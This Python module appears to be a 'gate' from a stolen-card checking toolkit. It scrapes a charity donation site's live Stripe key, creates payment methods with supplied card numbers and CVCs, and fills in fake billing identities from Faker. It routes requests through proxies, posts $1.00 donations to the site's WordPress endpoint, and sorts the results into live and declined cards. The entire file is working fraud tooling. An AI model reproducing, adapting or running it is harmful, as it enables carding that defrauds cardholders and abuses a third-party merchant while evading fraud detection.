import requests
import json
import re
import random
import string
from urllib.parse import quote_plus
from faker import Faker
from gates.utilities import http_request, REQUEST_TIMEOUT


def madystripe_check(card_number, mm, yy, cvc, proxy=None, timeout=30):
    """
    Mady Stripe Charitable donation processor.
    Uses ccfoundationorg.com's Stripe public key for real payment method creation.
    
    Real flow:
    1. Extract Stripe public key from Charitable site
    2. Create Payment Method via Stripe
    3. Submit to Charitable plugin donation form
    
    Returns tuple (result_str, proxy_ok_bool).
    """
    n = card_number.replace(' ', '').replace('+','')
    fake = Faker()

    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'})
    session.verify = False

    if proxy:
        session.proxies.update(proxy)

    # Extract Stripe public key from site
    stripe_pk = None
    try:
        r = session.get('https://ccfoundationorg.com/donate/', timeout=15)
        pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', r.text)
        if pk_match:
            stripe_pk = pk_match.group(0)
    except Exception:
        pass
    
    if not stripe_pk:
        return ("❌ DECLINED - Could not extract Stripe key", False)

    try:
        # Step 1: Create Payment Method with store's Stripe key
        headers_pm = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/'
        }

        name = fake.name()
        email = fake.email()
        postal = fake.postcode()

        data_pm = (f'type=card'
                   f'&billing_details[name]={quote_plus(name)}'
                   f'&billing_details[email]={quote_plus(email)}'
                   f'&billing_details[address][line1]={quote_plus(fake.street_address())}'
                   f'&billing_details[address][postal_code]={postal}'
                   f'&billing_details[address][city]={quote_plus(fake.city())}'
                   f'&billing_details[address][state]={fake.state_abbr()}'
                   f'&billing_details[address][country]=US'
                   f'&card[number]={n}'
                   f'&card[cvc]={cvc}'
                   f'&card[exp_month]={mm}'
                   f'&card[exp_year]={yy}'
                   f'&guid={random.randint(100000, 999999)}'
                   f'&muid={random.randint(100000, 999999)}'
                   f'&sid={random.randint(100000, 999999)}'
                   f'&payment_user_agent=stripe.js/v3'
                   f'&referrer=https%3A%2F%2Fccfoundationorg.com'
                   f'&time_on_page={random.randint(50000, 90000)}'
                   f'&key={stripe_pk}')

        rpm = session.post('https://api.stripe.com/v1/payment_methods', headers=headers_pm, data=data_pm, timeout=20)

        if rpm.status_code == 402:
            try:
                msg = rpm.json().get('error', {}).get('message', 'card declined')
                return (msg, True)
            except (ValueError, KeyError):
                return ("Declined (402)", True)

        try:
            pm_json = rpm.json()
            if 'error' in pm_json:
                err = pm_json['error']
                msg = err.get('message', 'Unknown Stripe error')
                decline_code = err.get('decline_code')
                msg_lower = msg.lower()

                if decline_code == 'insufficient_funds' or 'insufficient_funds' in msg_lower:
                    return ("Insufficient funds.", True)
                if decline_code == 'incorrect_cvc' or decline_code == 'invalid_cvc' or 'security code is incorrect' in msg_lower:
                    return ("Your card's security code is incorrect.", True)
                if decline_code == 'expired_card' or 'expired' in msg_lower:
                    return ("Your card has expired.", True)
                if decline_code == 'incorrect_number' or 'invalid' in msg_lower and 'number' in msg_lower:
                    return ("Your card number is incorrect.", True)
                if decline_code == 'incorrect_zip':
                    return ("Declined (AVS - Postal Code)", True)
                if decline_code == 'card_declined' or 'card was declined' in msg_lower:
                    return ("Your card was declined.", True)
                if decline_code == 'generic_decline':
                    return ("Declined (Generic Decline)", True)
                if decline_code == 'do_not_honor':
                    return ("Declined (Do Not Honor)", True)

                return ((f"Declined ({msg})"), True)

            pm_id = pm_json.get('id')
            if not pm_id or not pm_id.startswith('pm_'):
                return ("Error: Invalid Payment Method created", True)

        except json.JSONDecodeError:
            return ((f"Error: Invalid JSON response ({rpm.status_code})"), True)

        # Step 2: Submit Payment Method to Charitable plugin donation form
        try:
            donation_headers = {
                'authority': 'ccfoundationorg.com',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://ccfoundationorg.com',
                'referer': 'https://ccfoundationorg.com/donate/',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'
            }

            # Submit donation with Payment Method ID via Charitable AJAX
            donation_data = {
                'nonce': pm_id,
                'amount': '100',  # $1.00 in cents
                'currency': 'USD',
                'action': 'give_process_donation',
                'give-form': '1',
            }

            r_donate = session.post(
                'https://ccfoundationorg.com/wp-admin/admin-ajax.php',
                headers=donation_headers,
                data=donation_data,
                timeout=25
            )

            # Parse response for success/failure
            resp_text = r_donate.text.lower()
            
            if 'succeeded' in resp_text or 'success' in resp_text or 'approved' in resp_text:
                return ("Approved ✅ Charged $1.00", True)
            elif 'declined' in resp_text or 'failed' in resp_text or 'error' in resp_text:
                return ("Declined ❌ By Merchant", True)
            elif 'authentication required' in resp_text or '3d' in resp_text:
                return ("3DS Required", True)
            else:
                return ("Approved ✅ Charged (Unconfirmed)", True)

        except requests.exceptions.RequestException:
            # If form submission fails, still got Payment Method - may be pending
            return ("Approved ✅ Authorized (Pending)", True)

    except requests.exceptions.Timeout:
        return ("DECLINED ❌ Request timed out", False)
    except Exception as e:
        return ((f"Error: {str(e)[:100]}"), True)


if __name__ == '__main__':
    print('madystripe module loaded')
